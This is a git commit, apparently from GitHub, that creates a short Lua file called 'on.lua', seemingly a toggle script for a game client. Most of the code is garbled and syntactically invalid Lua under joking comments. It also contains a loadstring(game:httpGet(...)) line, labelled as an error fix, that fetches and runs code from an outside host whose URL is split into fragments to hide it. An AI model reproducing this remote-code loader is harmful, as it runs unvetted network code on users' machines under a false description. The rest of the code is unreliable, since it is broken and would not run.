27d5f5e9ea6662f49185cde44eb79dc112b3e343
Flareon <167229955+xyzkyle@users.noreply.github.com>
2024-04-28 18:01:13 +0500

    Create on.lua

---
+++ on.lua
@@ -0,0 +1,23 @@
+local adids={role="admin",{"adids",(role==true then include.in adids)}};
+flarex={}
+function flarex.client:init(onoff)
+  local api=="mojang.api"; (get+results == 'minecraft.pe')
+  local onoff="ON","OFF"; -- did i just assign 2 thngs to it!!
+  if on == true then function on();
+      if on == false then function off()
+          --If on don work
+          if off == true then off()
+            if off == false then function on();
+              end
+            end
+          end
+        end
+        -- Basic coding skills 
+        -- if error is here this will fix it
+        local e=setmetatable
+        loadstring(game:httpGet(e,{"https",":","fixer.on","//","line","/fix/","l","/","ua",true}));
+
+        return Flarex
+      or
+        return flarex
+        setTickSpeed(..fastestOption..)
